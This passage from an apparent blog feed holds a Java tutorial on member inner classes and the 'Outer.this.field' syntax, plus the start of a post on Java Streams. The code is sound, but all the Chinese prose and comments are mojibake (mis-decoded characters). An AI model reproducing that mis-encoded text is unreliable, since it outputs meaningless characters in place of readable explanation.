ç”¨çš„æ–¹æ³•æ‰èƒ½å¤Ÿè°ƒç”¨å†…éƒ¨ç±»çš„æˆå‘˜å˜é‡ã€‚è¿™ä¸€ç‚¹ç¨‹åºå¼€å‘äººå‘˜éœ€è¦åˆ‡è®°ã€‚æˆå‘˜å†…éƒ¨ç±»ä¸å¤–éƒ¨ç±»ç›¸äº’è®¿é—®å½¼æ­¤çš„æˆå‘˜æ–¹æ³•é™åˆ¶æ˜¯ä¸åŒçš„ã€‚ç‰¹åˆ«éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœåœ¨å¤–éƒ¨ç±»å’Œéé™æ€æ–¹æ³•ä¹‹å¤–å®ä¾‹åŒ–å†…éƒ¨å¯¹è±¡ï¼Œåˆ™éœ€è¦ä½¿ç”¨å¤–éƒ¨ç±»ã€‚å†…éƒ¨ç±»çš„å½¢å¼æ¥åˆ¶å®šè¿™ä¸ªå¯¹è±¡çš„ç±»å‹ã€‚è¿™éå¸¸çš„éº»çƒ¦ã€‚ä¸ºæ­¤è¦å°½é‡é¿å…åœ¨å¤–éƒ¨ç±»å’Œéé™æ€æ–¹æ³•ä¹‹å¤–å®ä¾‹åŒ–å†…éƒ¨ç±»å¯¹è±¡ã€‚å†è€…ï¼Œå†…éƒ¨ç±»å¯¹è±¡ä¼šä¾èµ–äºå¤–éƒ¨ç±»å¯¹è±¡ï¼Œé™¤éå·²ç»å­˜åœ¨ä¸€ä¸ªå¤–éƒ¨ç±»å¯¹è±¡ï¼Œå¦åˆ™ç±»ä¸­ä¸ä¼šå‡ºç°å†…éƒ¨ç±»å¯¹è±¡ã€‚ç®€å•çš„è¯´ï¼Œå†…éƒ¨ç±»å¯¹è±¡ä¸å¤–éƒ¨ç±»å¯¹è±¡ä¹‹é—´çš„å…³ç³»éå¸¸çš„ç´§å¯†ã€‚æœ‰æ—¶å€™å³åƒä¸€å¯¹çˆ¶å­ï¼ˆæˆå‘˜å†…éƒ¨ç±»å¯ä»¥éšæ„ä½¿ç”¨å¤–éƒ¨ç±»çš„æˆå‘˜ï¼‰ï¼Œæœ‰æ—¶å€™åˆåƒæ˜¯é™Œç”Ÿäººï¼ˆå¤–éƒ¨ç±»ä¸èƒ½å¤Ÿç›´æ¥ä½¿ç”¨å†…éƒ¨ç±»ä¸­çš„æˆå‘˜ï¼‰ã€‚ä½œä¸ºä¸€ä¸ªå‡ºè‰²çš„ç¨‹åºå¼€å‘äººå‘˜ï¼Œå¿…é¡»è¦æ·±å…¥äº†è§£å¤–éƒ¨ç±»å¯¹è±¡ä¸å†…éƒ¨ç±»å¯¹è±¡çš„å…³ç³»ã€‚å› ä¸ºåœ¨å®é™…å·¥ä½œä¸­ï¼Œåœ¨å¤–éƒ¨ç±»ä¸­å®šä¹‰æˆå‘˜å†…éƒ¨ç±»è¿˜æ˜¯å¾ˆå¸¸è§çš„ã€‚åªæœ‰äº†è§£ä»–ä»¬å½¼æ­¤ä¹‹é—´çš„å…³ç³»ï¼Œåœ¨ç¼–å†™åº”ç”¨ç¨‹åºä¸­ï¼Œæ‰å¯ä»¥æŠŠæ§å¥½ä»–ä»¬ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> demo02;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * **è¦åœ¨å¤–éƒ¨ç±»ä¸­å®ä¾‹åŒ–å†…éƒ¨ç±»å¯¹è±¡çš„å¼•ç”¨ã€‚**</span><br><span class="hljs-comment"> * [demo02]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : [å¸­å­ä¸ä¼šæ•²ä»£ç ]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> : [V1.0]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : [2023/1/4 10:23]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> <span class="hljs-number">1818</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;xtwoyxtwoy&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">A</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> getA();<br><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-variable">ageA</span> <span class="hljs-operator">=</span> <span class="hljs-number">18</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">nameA</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;xtwoy&quot;</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">ii</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * ç›´æ¥ä½¿ç”¨å¹¶é‡æ–°èµ‹å€¼å¤–éƒ¨ç±»çš„æˆå‘˜å˜é‡</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         * <span class="hljs-doctag">@param</span></span><br><span class="hljs-comment">         * <span class="hljs-doctag">@author</span> å¸­å­</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">priI</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(i);<br>            i = <span class="hljs-number">5</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;A&#123;&quot;</span> +<br>                    <span class="hljs-string">&quot;ageA=&quot;</span> + ageA +<br>                    <span class="hljs-string">&quot;, nameA=&#x27;&quot;</span> + nameA + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                    <span class="hljs-string">&quot;, ii=&quot;</span> + ii +<br>                    <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@author</span> å¸­å­</span><br><span class="hljs-comment">      * <span class="hljs-doctag">@param</span></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">priSexByA</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-comment">//        priI(); //ç¼–è¯‘é”™è¯¯</span><br>        a.priI();<br>        System.out.println(<span class="hljs-string">&quot;ä½¿ç”¨priIä¹‹åçš„I=ã€‹&quot;</span> + i);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">priII</span><span class="hljs-params">()</span> &#123;<br>        System.out.println();<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * åœ¨å¤–éƒ¨ç±»ä¸­åˆ©ç”¨newå…³é”®å­—æ¥å®ä¾‹åŒ–å†…éƒ¨ç±»å¯¹è±¡çš„å¼•ç”¨</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span></span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> demo02.Demo01.A</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@author</span> å¸­å­</span><br><span class="hljs-comment">     */</span><br>    A <span class="hljs-title function_">getA</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">A</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">priA</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(a.ageA);<br>        System.out.println(a.nameA);<br>        System.out.println(a.ii);<br>        <span class="hljs-comment">//ä¸€ä¸‹å…¨éƒ¨å‡ºç°ç¼–è¯‘é”™è¯¯</span><br><span class="hljs-comment">//        System.out.println(ageA);</span><br><span class="hljs-comment">//        System.out.println(nameA);</span><br><span class="hljs-comment">//        System.out.println(ii);</span><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Demo01&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;age=&quot;</span> + age +<br>                <span class="hljs-string">&quot;, name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, a=&quot;</span> + a +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>ä½¿ç”¨thiså…³é”®å­—è·å–å†…éƒ¨ç±»ä¸å¤–éƒ¨ç±»å¯¹è±¡çš„å¼•ç”¨ã€‚</strong></p><p>åœ¨å¤–éƒ¨ç±»å’Œæˆå‘˜å†…éƒ¨ç±»ä¸­ï¼Œéƒ½å¯ä»¥å®šä¹‰å˜é‡ã€‚æˆå‘˜å†…éƒ¨ç±»å¯ä»¥éšæ„è®¿é—®å¤–éƒ¨ç±»ä¸­çš„å˜é‡ï¼Œè€Œå¤–éƒ¨ç±»ä¸èƒ½å¤Ÿç›´æ¥è®¿é—®å†…éƒ¨ç±»ä¸­çš„å˜é‡ï¼Œåªæœ‰é€šè¿‡ä½¿ç”¨å†…éƒ¨ç±»å¯¹è±¡æ¥å¼•ç”¨å†…éƒ¨ç±»çš„æˆå‘˜å˜é‡ã€‚ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨å¤–éƒ¨ç±»ä¸­å®šä¹‰çš„å˜é‡ä¸å†…éƒ¨ç±»ä¸­å®šä¹‰çš„å˜é‡åå­—å¯ä»¥ç›¸åŒã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨å¤–éƒ¨ç±»ä¸­å¯ä»¥å®šä¹‰ä¸€ä¸ªå˜é‡iï¼Œåœ¨å†…éƒ¨ç±»ä¸­ä¹Ÿå¯ä»¥å®šä¹‰ä¸€ä¸ªå˜é‡iã€‚æ­¤æ—¶æ–°çš„é—®é¢˜å°±å‡ºæ¥äº†ã€‚ç”±äºåœ¨å†…éƒ¨ç±»ä¸­å¯ä»¥éšæ„è®¿é—®å¤–éƒ¨ç±»ä¸­æˆå‘˜æ–¹æ³•ä¸æˆå‘˜å˜é‡ã€‚ä½†æ˜¯æ­¤æ—¶æˆå‘˜å†…éƒ¨ç±»ä¸å¤–éƒ¨ç±»çš„å˜é‡åç›¸åŒï¼Œé‚£ä¹ˆå¦‚æœè¦åœ¨å†…éƒ¨ç±»ä½¿ç”¨è¿™ä¸ªå˜é‡iï¼Œç¼–è¯‘å™¨æ€ä¹ˆçŸ¥é“ç°åœ¨éœ€è¦è°ƒç”¨å¤–éƒ¨ç±»çš„å˜é‡iï¼Œè¿˜æ˜¯å†…éƒ¨ç±»çš„å˜é‡iå‘¢ï¼Ÿ</p><p>åœ¨å®é™…å·¥ä½œä¸­ï¼Œåº”è¯¥å°½é‡é¿å…è¿™ç§æƒ…å†µã€‚å³åœ¨å®šä¹‰å˜é‡åå­—çš„æ—¶å€™ï¼ŒJavaå†…éƒ¨ç±»ä¸­çš„å˜é‡åå­—å°½é‡ä¸è¦ä¸å¤–éƒ¨ç±»ä¸­çš„å˜é‡åå­—ç›¸åŒã€‚ä½†æ˜¯å¦‚æœçœŸçš„å‘ç”Ÿè¿™ç§æƒ…å†µçš„è¯ï¼ŒJavaç¼–è¯‘å™¨è¿˜æ˜¯æœ‰æ‰‹æ®µå¯ä»¥è§£å†³è¿™ä¸ªå˜é‡åå­—çš„å†²çªé—®é¢˜ã€‚å¦‚æœåœ¨ç±»ä¸­çš„æˆå‘˜å†…éƒ¨ç±»ä¸­é‡åˆ°æˆå‘˜å˜é‡åå­—ä¸å¤–éƒ¨ç±»ä¸­çš„æˆå‘˜å˜é‡åå­—ç›¸åŒï¼Œåˆ™å¯ä»¥é€šè¿‡ä½¿ç”¨thiså…³é”®å­—æ¥åŠ ä»¥åŒºåˆ«ã€‚å¦‚ç°åœ¨æœ‰ä¸€ä¸ªç±»åå­—å«åš<code>Demo01</code>.è€Œåœ¨è¿™ä¸ªç±»ä¸­åˆåˆ›å»ºäº†ä¸€ä¸ªæˆå‘˜å†…éƒ¨ç±»ï¼Œåå­—å«åš<code>age</code>.ç°åœ¨åœ¨è¿™ä¸¤ä¸ªç±»ä¸­å„è‡ªå®šä¹‰äº†ä¸€ä¸ªæˆå‘˜å˜é‡iï¼Œç”¨æ¥åšå¾ªç¯ä¹‹ç”¨ã€‚æ­¤æ—¶å¦‚æœåœ¨æˆå‘˜å†…éƒ¨ç±»ä¸­è°ƒç”¨è¿™ä¸ªå˜é‡ï¼Œè¯¥å¦‚ä½•è¿›è¡ŒåŒºåˆ†å‘¢ï¼Ÿé€šå¸¸æƒ…å†µä¸‹ï¼Œå¦‚æœä½¿ç”¨this.içš„æ–¹å¼æ¥è°ƒç”¨å˜é‡ï¼Œåˆ™è¡¨ç¤ºè¿™ä¸ªå˜é‡æ˜¯æˆå‘˜å†…éƒ¨ç±»ä¸­å®šä¹‰çš„å˜é‡ã€‚è€Œé€šè¿‡ä½¿ç”¨<code>Demo01.this.i</code>çš„å½¢å¼è°ƒç”¨å˜é‡æ—¶è¡¨ç¤ºæ­¤æ—¶å¼•ç”¨çš„æ˜¯å¤–éƒ¨ç±»çš„æˆå‘˜å˜é‡ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœå†…éƒ¨ç±»ä¸­å¼•ç”¨å¤–éƒ¨ç±»ä¸­åŒåçš„æˆå‘˜ï¼Œéœ€è¦é€šè¿‡å¤–éƒ¨ç±»è¿·åå­—ã€‚<code>this.</code>å¤–éƒ¨ç±»æˆå‘˜åå­—çš„æ–¹å¼åŠ ä»¥å¼•ç”¨ã€‚è€Œä¸”ï¼Œåœ¨å¼•ç”¨æˆå‘˜å†…éƒ¨ç±»è‡ªå·±çš„å®šä¹‰çš„æˆå‘˜æ—¶ä¹Ÿéœ€è¦ä½¿ç”¨thiså…³é”®å­—ï¼Œä»¥åŠ ä»¥åŒºåˆ«ã€‚æ˜¾ç„¶è¿™éå¸¸çš„éº»çƒ¦ã€‚ä¸ºæ­¤ç¬”è€…ä»ç„¶è¦å¼ºè°ƒä¸€éï¼Œé™¤éæœ‰éå¸¸ç‰¹æ®Šçš„å¿…è¦ï¼Œå¦åˆ™çš„è¯è¦å°½é‡é¿ä¸¤å¤–éƒ¨ç±»ä¸æˆå‘˜å†…éƒ¨ç±»ä¸­æˆå‘˜å˜é‡æˆ–è€…æˆå‘˜æ–¹æ³•é‡‡ç”¨ç›¸åŒçš„åå­—ã€‚å¦åˆ™çš„è¯ï¼Œä¼šç»™åç»­çš„å¼•ç”¨å¸¦æ¥å¾ˆå¤§çš„éº»çƒ¦ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> demo02;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * **è¦åœ¨å¤–éƒ¨ç±»ä¸­å®ä¾‹åŒ–å†…éƒ¨ç±»å¯¹è±¡çš„å¼•ç”¨ã€‚**</span><br><span class="hljs-comment"> * [demo02]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : [å¸­å­ä¸ä¼šæ•²ä»£ç ]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> : [V1.0]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : [2023/1/4 10:23]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> <span class="hljs-number">1818</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;xtwoyxtwoy&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">A</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> getA();<br><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> <span class="hljs-number">18</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">nameA</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;xtwoy&quot;</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">ii</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>       <span class="hljs-keyword">void</span> <span class="hljs-title function_">priAges</span><span class="hljs-params">()</span>&#123;<br>           System.out.println(age);<br>           System.out.println(<span class="hljs-built_in">this</span>.age);<br>           System.out.println(Demo01.<span class="hljs-built_in">this</span>.age);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">priAges</span><span class="hljs-params">()</span>&#123;<br>        a.priAges();<br>    &#125;<br><br><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * åœ¨å¤–éƒ¨ç±»ä¸­åˆ©ç”¨newå…³é”®å­—æ¥å®ä¾‹åŒ–å†…éƒ¨ç±»å¯¹è±¡çš„å¼•ç”¨</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span></span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> demo02.Demo01.A</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@author</span> å¸­å­</span><br><span class="hljs-comment">     */</span><br>    A <span class="hljs-title function_">getA</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">A</span>();<br>    &#125;<br><br><br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230104111600040.png" alt="image-20230104111600040" /></p><p>åœ¨<code>ArrayList</code>æºç ä¸­é€šè¿‡<code>ç±»å.this.æˆå‘˜å˜é‡å</code>ä½¿ç”¨å¤–éƒ¨ç±»çš„æˆå‘˜å˜é‡ã€‚å†…éƒ¨ç±»æ˜¯<code>Itr</code></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230104112240678.png" alt="image-20230104112240678" /></p><p>åœ¨å¤–éƒ¨ç±»ä¹‹å¤–ä½¿ç”¨å†…éƒ¨ç±»æˆå‘˜å˜é‡ï¼Œå†…éƒ¨ç±»çš„æˆå‘˜å˜é‡ä¸æ–¹æ³•å…¨éƒ¨è¢«éšè—èµ·æ¥ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230104112026176.png" alt="image-20230104112026176" /></p><p>ä»ä»¥ä¸Šçš„æ€»ç»“ä¸­å¯ä»¥çœ‹å‡ºï¼Œæˆå‘˜å†…éƒ¨ç±»ä¸å¤–éƒ¨ç±»ä¹‹é—´çš„å…³ç³»ç¡®å®å¾ˆå¤æ‚ã€‚ä½œä¸ºä¸€ä¸ªJavaç¨‹åºå¼€å‘äººå‘˜ï¼Œå¿…é¡»è¦äº†è§£å†…éƒ¨ç±»ä¸å¤–éƒ¨ç±»æˆå‘˜ç›¸äº’ä¹‹é—´å¼•ç”¨çš„å‡†åˆ™ã€å†…éƒ¨ç±»å¯¹è±¡ä¸å¤–éƒ¨ç±»å¯¹è±¡çš„å…³ç³»ã€‚åœ¨ç¼–å†™ä»£ç çš„æ—¶å€™ï¼Œå°½é‡é¿å…å†…éƒ¨ç±»ä¸å¤–éƒ¨ç±»ä¸­æˆå‘˜å˜é‡ä¸æˆå‘˜æ–¹æ³•çš„å‘½åå†²çªã€‚å¦‚æœçœŸçš„å‘ç”Ÿé‡åçš„è¯ï¼Œè¦å­¦ä¼šåˆ©ç”¨thiså…³é”®å­—æ¥æ¶ˆé™¤è¿™ä¸ªå†²çªã€‚ç¬”è€…ä¸Šé¢è°ˆçš„ä¸€äº›æ³¨æ„å®ç°ä¹Ÿæ˜¯ä¸€äº›æ¯”è¾ƒæŠ½è±¡çš„å†…å®¹ï¼Œéœ€è¦å¼€å‘äººå‘˜åœ¨å®é™…å·¥ä½œä¸­å»é¢†æ‚Ÿã€‚</p><p>å‚è€ƒ<a href="https://blog.csdn.net/caolaosanahnu">caolaosanahnu</a><a href="https://blog.csdn.net/caolaosanahnu/article/details/19486615">åœ¨Javaå†…éƒ¨ç±»ä¸­ä½¿ç”¨å¤–éƒ¨ç±»çš„æˆå‘˜æ–¹æ³•ä»¥åŠæˆå‘˜å˜é‡</a></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
      <tag>åŸºç¡€</tag>
      
      <tag>å†…éƒ¨ç±»</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å‡½æ•°å¼ç¼–ç¨‹-Streamæµ</title>
    <link href="/2022/12/21/%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B/"/>
    <url>/2022/12/21/%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="å‡½æ•°å¼ç¼–ç¨‹-streamæµ"><a class="markdownIt-Anchor" href="#å‡½æ•°å¼ç¼–ç¨‹-streamæµ"></a> å‡½æ•°å¼ç¼–ç¨‹-Streamæµ</h1><h2 id="1-æ¦‚è¿°"><a class="markdownIt-Anchor" href="#1-æ¦‚è¿°"></a> 1. æ¦‚è¿°</h2><h3 id="11-ä¸ºä»€ä¹ˆå­¦"><a class="markdownIt-Anchor" href="#11-ä¸ºä»€ä¹ˆå­¦"></a> 1.1 ä¸ºä»€ä¹ˆå­¦ï¼Ÿ</h3><ul><li>èƒ½å¤Ÿçœ‹æ‡‚å…¬å¸é‡Œçš„ä»£ç </li><li>å¤§æ•°é‡ä¸‹å¤„ç†é›†åˆæ•ˆç‡é«˜</li><li>ä»£ç å¯è¯»æ€§é«˜</li><li>æ¶ˆç­åµŒå¥—åœ°ç‹±</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//æŸ¥è¯¢æœªæˆå¹´ä½œå®¶çš„è¯„åˆ†åœ¨70ä»¥ä¸Šçš„ä¹¦ç± ç”±äºæ´‹æµå½±å“æ‰€ä»¥ä½œå®¶å’Œä¹¦ç±å¯èƒ½å‡ºç°é‡å¤ï¼Œéœ€è¦è¿›è¡Œå»é‡</span><br>List&lt;Book&gt; bookList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>Set&lt;Book&gt; uniqueBookValues = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();<br>Set&lt;Author&gt; uniqueAuthorValues = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();<br><span class="hljs-keyword">for</span> (Author author : authors) &#123;<br>    <span class="hljs-keyword">if</span> (uniqueAuthorValues.add(author)) &#123;<br>        <span class="hljs-keyword">if</span> (author.getAge() &lt; <span class="hljs-number">18</span>) &#123;<br>            List&lt;Book&gt; books = author.getBooks();<br>            <span class="hljs-keyword">for</span> (Book book : books) &#123;<br>                <span class="hljs-keyword">if</span> (book.getScore() &gt; <span class="hljs-number">70</span>) &#123;<br>                    <span class="hljs-keyword">if</span> (uniqueBookValues.add(book)) &#123;<br>                        bookList.add(book);<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br>System.out.println(bookList);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;Book&gt; collect = authors.stream()<br>    .distinct()<br>    .filter(author -&gt; author.getAge() &lt; <span class="hljs-number">18</span>)<br>    .map(author -&gt; author.getBooks())<br>    .flatMap(Collection::stream)<br>    .filter(book -&gt; book.getScore() &gt; <span class="hljs-number">70</span>)<br>    .distinct()<br>    .collect(Collectors.toList());<br>System.out.println(collect);<br></code></pre></td></tr></table></figure><h3 id="12-å‡½æ•°å¼ç¼–ç¨‹æ€æƒ³"><a class="markdownIt-Anchor" href="#12-å‡½æ•°å¼ç¼–ç¨‹æ€æƒ³"></a> 1.2 å‡½æ•°å¼ç¼–ç¨‹æ€æƒ³</h3><h4 id="121-æ¦‚å¿µ"><a class="markdownIt-Anchor" href="#121-æ¦‚å¿µ"></a> 1.2.1 